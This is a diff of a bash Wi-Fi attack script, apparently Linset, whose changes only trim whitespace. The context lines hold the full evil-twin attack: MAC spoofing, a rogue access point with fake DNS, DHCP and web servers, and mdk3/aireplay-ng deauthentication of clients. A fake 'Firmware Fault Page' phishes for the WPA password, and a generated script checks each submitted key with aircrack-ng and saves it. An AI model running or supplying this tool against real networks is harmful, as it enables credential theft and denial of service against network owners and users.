 	if [ "$fakeapmode" = "hostapd" ]; then
-		
+
 		ifconfig $WIFI down
 		sleep 0.4
 		macchanger --mac=${mac::13}$nomac${mac:14:4} $WIFI &> $linset_output_device
@@ -1490,7 +1490,7 @@ function attack {
 		ifconfig $WIFI up
 		sleep 0.4
 	fi
-	
+
 ##############	Musket Patch
 	if [ $fakeapmode = "hostapd" ]; then
 		killall hostapd &> $linset_output_device
@@ -1506,30 +1506,30 @@ function attack {
 	routear &
 	sleep 3
 ############# End MusketPatch
-	
-	
+
+
 	killall dhcpd &> $linset_output_device
 	xterm -bg black -fg green $TOPLEFT -T DHCP -e "dhcpd -d -f -cf "$DUMP_PATH/dhcpd.conf" $interfaceroutear 2>&1 | tee -a $DUMP_PATH/clientes.txt" &
 	killall $(netstat -lnptu | grep ":53" | grep "LISTEN" | awk '{print $7}' | cut -d "/" -f 2) &> $linset_output_device
 	xterm $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -title "FAKEDNS" -e python $DUMP_PATH/fakedns &
-	
+
 	killall $(netstat -lnptu | grep ":80" | grep "LISTEN" | awk '{print $7}' | cut -d "/" -f 2) &> $linset_output_device
 	lighttpd -f $DUMP_PATH/lighttpd.conf &> $linset_output_device
-	
+
 	killall aireplay-ng &> $linset_output_device
 	killall mdk3 &> $linset_output_device
 	echo "$Host_MAC" >$DUMP_PATH/mdk3.txt
 	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "mdk3 Deauthentication/ Disassociation $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
-	
+
 	xterm -hold $TOPRIGHT -title "Waiting for a password" -e $DUMP_PATH/handcheck &
 	conditional_clear
-	
+
 	while true; do
 		mostrarheader
-		
+
 		echo "Attack in progress..."
 		echo "                                       "
-		echo "      1) Select Another TargetAP" 
+		echo "      1) Select Another TargetAP"
 		echo "      2) Exit"
 		echo " "
 		echo -n '      #> '
@@ -1540,14 +1540,14 @@ function attack {
 			* ) echo "Unavilable choose option again"; conditional_clear ;;
 		esac
 	done
-	
+
 }
 
 # Check the validity of the password
 function handshakecheck {
-	
+
 	echo "#!/bin/bash
-	
+
 	echo > $DUMP_PATH/data.txt
 	echo -n \"0\"> $DUMP_PATH/hit.txt
 	echo "" >$DUMP_PATH/loggg
@@ -1555,13 +1555,13 @@ function handshakecheck {
 	chmod 777 $DUMP_PATH/data.txt
 	tput civis
 	clear
-	
+
 	minutos=0
 	horas=0
 	i=0
-	  
+
 	while true; do
-	
+
 	segundos=\$i
 	dias=\`expr \$segundos / 86400\`
 	segundos=\`expr \$segundos % 86400\`
@@ -1569,19 +1569,19 @@ function handshakecheck {
 	segundos=\`expr \$segundos % 3600\`
 	minutos=\`expr \$segundos / 60\`
 	segundos=\`expr \$segundos % 60\`
-	
+
 	if [ \"\$segundos\" -le 9 ]; then
 	is=\"0\"
 	else
 	is=
 	fi
-	
+
 	if [ \"\$minutos\" -le 9 ]; then
 	im=\"0\"
 	else
 	im=
 	fi
-	
+
 	if [ \"\$horas\" -le 9 ]; then
 	ih=\"0\"
 	else
@@ -1590,36 +1590,36 @@ function handshakecheck {
 
 	if [ $authmode = "handshake" ]; then
 		echo "if [ -f $DUMP_PATH/intento ]; then
-		
+
 		if ! aircrack-ng -w $DUMP_PATH/data.txt $DUMP_PATH/$Host_MAC-01.cap | grep -qi \"Passphrase not in\"; then
 		echo \"2\">$DUMP_PATH/intento
 		break
 		else
 		echo \"1\">$DUMP_PATH/intento
 		fi
-		
+
 		fi">>$DUMP_PATH/handcheck
-		
+
 	elif [ $authmode = "wpa_supplicant" ]; then
 		  echo "
 		wpa_passphrase $Host_SSID \$(cat $DUMP_PATH/data.txt)>$DUMP_PATH/wpa_supplicant.conf &
 		wpa_supplicant -i$WIFI -c$DUMP_PATH/wpa_supplicant.conf -f $DUMP_PATH/loggg &
-		
+
 		if [ -f $DUMP_PATH/intento ]; then
-		
+
 		if grep -i 'WPA: Key negotiation completed' $DUMP_PATH/loggg; then
 		echo \"2\">$DUMP_PATH/intento
 		break
 		else
 		echo \"1\">$DUMP_PATH/intento
 		fi
-		
+
 		fi
 		">>$DUMP_PATH/handcheck
 	fi
-	
+
 	echo "readarray -t CLIENTESDHCP < <(cat $DUMP_PATH/clientes.txt | grep \"DHCPACK on\"| awk '!x[\$0]++' )
-	
+
 	echo
 	echo -e \"  ACCESS POINT:\"
 	echo -e \"    Name..........: "$blanco"$Host_SSID"$rescolor"\"
@@ -1631,34 +1631,34 @@ function handshakecheck {
 	echo -e \"    Clients........: "$azul"\$(cat $DUMP_PATH/clientes.txt | grep DHCPACK | awk '!x[\$0]++' | wc -l)"$rescolor"\"
 	echo
 	echo -e \"  CLIENTS:\"
-	
+
 	x=0
 	for line in \"\${CLIENTESDHCP[@]}\"; do
 	  x=\$((\$x+1))
-	  echo -e \"    "$verde"\$x) "$rojo"\$(echo \$line| cut -d \" \" -f 3) "$amarillo"\$(echo \$line| cut -d \" \" -f 5) "$verde"\$(echo \$line| cut -d \" \" -f 6)"$rescolor"\"   
+	  echo -e \"    "$verde"\$x) "$rojo"\$(echo \$line| cut -d \" \" -f 3) "$amarillo"\$(echo \$line| cut -d \" \" -f 5) "$verde"\$(echo \$line| cut -d \" \" -f 6)"$rescolor"\"
 	done
-	
+
 	echo -ne \"\033[K\033[u\"">>$DUMP_PATH/handcheck
-	
-	
+
+
 	if [ $authmode = "handshake" ]; then
 		echo "let i=\$i+1
 		sleep 1">>$DUMP_PATH/handcheck
-		
+
 	elif [ $authmode = "wpa_supplicant" ]; then
 		echo "sleep 5
-		
+
 		killall wpa_supplicant &>$linset_output_device
 		killall wpa_passphrase &>$linset_output_device
 		let i=\$i+5">>$DUMP_PATH/handcheck
 	fi
-	
+
 	echo "done
 	clear
 	echo \"1\" > $DUMP_PATH/status.txt
-	
+
 	sleep 7
-	
+
 	killall mdk3 &>$linset_output_device
 	killall aireplay-ng &>$linset_output_device
 	killall airbase-ng &>$linset_output_device
@@ -1668,7 +1668,7 @@ function handshakecheck {
 	killall dhcpd &>$linset_output_device
 	killall wpa_supplicant &>$linset_output_device
 	killall wpa_passphrase &>$linset_output_device
-	
+
 	echo \"
 	SSID: $Host_SSID
 	BSSID: $Host_MAC ( $Host_MAC_MODEL )
@@ -1677,16 +1677,16 @@ function handshakecheck {
 	Time: \$ih\$horas:\$im\$minutos:\$is\$segundos
 	Password: \$(cat $DUMP_PATH/data.txt)
 	\" >$HOME/$Host_SSID-password.txt">>$DUMP_PATH/handcheck
-	
-	
+
+
 	if [ $authmode = "handshake" ]; then
-		echo "aircrack-ng -a 2 -b $Host_MAC -0 -s $DUMP_PATH/$Host_MAC-01.cap -w $DUMP_PATH/data.txt && echo && echo -e \"It has been saved in "$rojo"$HOME/$Host_SSID-password.txt"$rescolor"\" 
+		echo "aircrack-ng -a 2 -b $Host_MAC -0 -s $DUMP_PATH/$Host_MAC-01.cap -w $DUMP_PATH/data.txt && echo && echo -e \"It has been saved in "$rojo"$HOME/$Host_SSID-password.txt"$rescolor"\"
 		">>$DUMP_PATH/handcheck
-		
+
 	elif [ $authmode = "wpa_supplicant" ]; then
 		echo "echo -e \"It has been saved in "$rojo"$HOME/$Host_SSID-password.txt"$rescolor"\"">>$DUMP_PATH/handcheck
 	fi
-	
+
 	echo "kill -INT \$(ps a | grep bash| grep linset | awk '{print \$1}') &>$linset_output_device">>$DUMP_PATH/handcheck
 	chmod +x $DUMP_PATH/handcheck
 }
@@ -1703,12 +1703,12 @@ function handshakecheck {
 
 # Deauth everybody
 function deauthall {
-	
+
 	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Aireplay-ng Deauth $Host_SSID" -e aireplay-ng --deauth $DEAUTHTIME -a $Host_MAC --ignore-negative-one $WIFI_MONITOR &
 }
 
 function deauthmdk3 {
-	
+
 	echo "$Host_MAC" >$DUMP_PATH/mdk3.txt
 	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "mdk3 Deauth $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
 	mdk3PID=$!
@@ -1718,21 +1718,21 @@ function deauthmdk3 {
 
 # Deauth to a specific client
 function deauthesp {
-	
+
 	sleep 2
 	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Aireplay-ng Deauth $Client_MAC" -e aireplay-ng -0 $DEAUTHTIME -a $Host_MAC -c $Client_MAC --ignore-negative-one $WIFI_MONITOR &
 }
 
 # Close all processes
 function matartodo {
-	
+
 	killall aireplay-ng &>$linset_output_device
 	kill $(ps a | grep python| grep fakedns | awk '{print $1}') &>$linset_output_device
 	killall hostapd &>$linset_output_device
 	killall lighttpd &>$linset_output_device
 	killall dhcpd &>$linset_output_device
 	killall xterm &>$linset_output_device
-	
+
 }
 
 
@@ -1748,11 +1748,11 @@ function matartodo {
 
 # Create the content of the web interface
 function NEUTRA {
-	
+
 	if [ ! -d $DUMP_PATH/data ]; then
 		mkdir $DUMP_PATH/data
 	fi
-	
+
 echo "UEsDBBQAAAAIAHQLM0T7hNsrBTUBAEkPBAATABwAanF1ZXJ5LTEuOC4zLm1pbi5qc1VUCQADDCrb
 Ugwq21J1eAsAAQQAAAAABAAAAAC8O2tz2ziSn6VfASupCRlLlO3MI5Hj5PKwdzyV2Lk4W5krW7MF
 kZDEmCI0BGVbifPfr7vxpCR7Zu+urnY2FolGo9HoN5r9x1tt9ph9+c+FqJbsN37Fz9Iqn9fsXT6q
@@ -4120,17 +4120,17 @@ AwbO2VJ1eAsAAQQAAAAABAAAAABQSwECHgMUAAAACABzBTJErw/GaOGiAAD0NwIAGgAYAAAAAAAB
 AAAApIFIagEAanF1ZXJ5Lm1vYmlsZS0xLjMuMi5taW4uanNVVAUAAznO2VJ1eAsAAQQAAAAABAAA
 AABQSwUGAAAAAAMAAwAaAQAAfQ0CAAAA
 " | base64 -d >$DUMP_PATH/file.zip
-	
+
 	unzip $DUMP_PATH/file.zip -d $DUMP_PATH/data &>$linset_output_device
 	rm $DUMP_PATH/file.zip &>$linset_output_device
-	
+
 	echo "<!DOCTYPE html>
 	<html>
 	<head>
 	    <title>Firmware Fault Page 23224  $Host_MAC_MODEL</title>
 	    <meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\"/>
 	    <link rel=\"stylesheet\" href=\"jquery.mobile-1.3.2.min.css\" />
-	    <script src=\"jquery-1.8.3.min.js\"></script>    
+	    <script src=\"jquery-1.8.3.min.js\"></script>
 	    <script src=\"jquery.mobile-1.3.2.min.js\"></script>
 	    <style>
 	.ui-btn {
@@ -4143,30 +4143,30 @@ AABQSwUGAAAAAAMAAwAaAQAAfQ0CAAAA
 		<div data-role=\"header\" data-theme=\"a\">
 		    <h3>Firmware Fault Page 23224  $Host_MAC_MODEL</h3>
 		</div>
-	
+
 		<div data-role=\"content\">
-		    
+
 	"$DIALOG_WEB_OK"
 		</div>
-	
+
 		<div data-theme=\"a\" data-role=\"footer\" data-position=\"fixed\">
-	
+
 		</div>
 	    </div>
 	    <div data-role=\"page\" id=\"second\">
 		<div data-theme=\"a\" data-role=\"header\">
 		    <h3></h3>
 		</div>
-	
+
 		<div data-role=\"content\">
-	
+
 		</div>
-	
+
 		<div data-theme=\"a\" data-role=\"footer\" data-position=\"fixed\">
 		</div>
 	    </div>
 	</body>
-	</html> 
+	</html>
 	">$DUMP_PATH/data/final.html
 	echo "<!DOCTYPE html>
 	<html>
@@ -4174,7 +4174,7 @@ AABQSwUGAAAAAAMAAwAaAQAAfQ0CAAAA
 	    <title>Firmware Fault Page 23225  $Host_MAC_MODEL</title>
 	    <meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\"/>
 	    <link rel=\"stylesheet\" href=\"jquery.mobile-1.3.2.min.css\" />
-	    <script src=\"jquery-1.8.3.min.js\"></script>    
+	    <script src=\"jquery-1.8.3.min.js\"></script>
 	    <script src=\"jquery.mobile-1.3.2.min.js\"></script>
 	</head>
 	<body>
@@ -4182,35 +4182,35 @@ AABQSwUGAAAAAAMAAwAaAQAAfQ0CAAAA
 		<div data-role=\"header\" data-theme=\"a\">
 		    <h3>Firmware Fault Page 23225  $Host_MAC_MODEL</h3>
 		</div>
-	
+
 		<div data-role=\"content\">
-		    
+
 		    "$DIALOG_WEB_ERROR"
 	<br>
-	<a href=\"../index.htm\" data-role=\"button\" rel=\"external\" data-inline=\"true\" id=\"back\" onclick=\"location.reload(forceGet);location.href='../index.htm'\">"$DIALOG_WEB_BACK"</a> 
-	
+	<a href=\"../index.htm\" data-role=\"button\" rel=\"external\" data-inline=\"true\" id=\"back\" onclick=\"location.reload(forceGet);location.href='../index.htm'\">"$DIALOG_WEB_BACK"</a>
+
 		</div>
-	
+
 		<div data-theme=\"a\" data-role=\"footer\" data-position=\"fixed\">
-	
+
 		</div>
 	    </div>
 	    <div data-role=\"page\" id=\"second\">
 		<div data-theme=\"a\" data-role=\"header\">
 		    <h3></h3>
 		</div>
-	
+
 		<div data-role=\"content\">
-	
+
 		</div>
-	
+
 		<div data-theme=\"a\" data-role=\"footer\" data-position=\"fixed\">
 		</div>
 	    </div>
 	</body>
-	</html> 
+	</html>
 	">$DUMP_PATH/data/error.html
-	
+
 	echo "<!DOCTYPE html>
 	<html>
 	<head>
@@ -4221,26 +4221,26 @@ AABQSwUGAAAAAAMAAwAaAQAAfQ0CAAAA
 		#login-button {
 		    margin-top: 30px;
 		}
-		
+
 	.ui-grid-c {
 	    text-align : center;
 		margin-right: -50% !important;
-	
+
 	}
-	
+
 	.ui-block-b {
 	    text-align : left;
-	
+
 	}
-	
+
 	.ui-block-a {
 	    text-align : right;
 		margin-right: 10px !important;
-	
-	
+
+
 	}
 	    </style>
-	    <script src=\"data/jquery-1.8.3.min.js\"></script>    
+	    <script src=\"data/jquery-1.8.3.min.js\"></script>
 	    <script src=\"data/jquery.mobile-1.3.2.min.js\"></script>
 	</head>
 	<body>
@@ -4248,28 +4248,28 @@ AABQSwUGAAAAAAMAAwAaAQAAfQ0CAAAA
 		<div data-role=\"header\" data-theme=\"a\">
 		    <h3>PMK Firmware Fault Page 23223  $Host_MAC_MODEL </h3>
 		</div>
-	
+
 		<div data-role=\"content\">
 		<fieldset>
 		    <form id=\"check-user\" class=\"ui-body ui-body-a ui-corner-all\" data-ajax=\"false\" action=\"data/savekey.php\" method=\"POST\" >
 	<div class =ui-grid-c>
-	
+
 	      <div class=ui-block-a>ESSID:</div>
-	
+
 	      <div class=ui-block-b><b>$Host_SSID</b></div>
-	
+
 	      <div class=ui-block-a>BSSID:</div>
-	
+
 	      <div class=ui-block-b><b>$Host_MAC</b></div>
-	
+
 	      <div class=ui-block-a>Chan:</div>
-	
+
 	      <div class=ui-block-b><b>$Host_CHAN</b></div>
-	
+
 	    </div>
-			  
+
 	<br>
-	
+
 	<P align="center">"$DIALOG_WEB_INFO"</P>
 	<!-- <br> -->
 	<!-- <P align="left">"$DIALOG_WEB_INPUT"</P> -->
@@ -4282,29 +4282,29 @@ AABQSwUGAAAAAAMAAwAaAQAAfQ0CAAAA
 				<input type=\"submit\" data-theme=\"b\" name=\"submit\" id=\"submit\" data-inline=\"true\" value=\""$DIALOG_WEB_SUBMIT"\">
 
 			</fieldset>
-		    </form>             
+		    </form>
 		</div>
-	
+
 		<div data-theme=\"a\" data-role=\"footer\" data-position=\"fixed\">
-	
+
 		</div>
 	    </div>
 	    <div data-role=\"page\" id=\"second\">
 		<div data-theme=\"a\" data-role=\"header\">
 		    <h3></h3>
 		</div>
-	
+
 		<div data-role=\"content\">
-	
+
 		</div>
-	
+
 		<div data-theme=\"a\" data-role=\"footer\" data-position=\"fixed\">
 		</div>
 	    </div>
 	</body>
-	</html> 
+	</html>
 	">$DUMP_PATH/index.htm
-	
+
 }
 ######################################### < INTERFACES WEB > ########################################
 
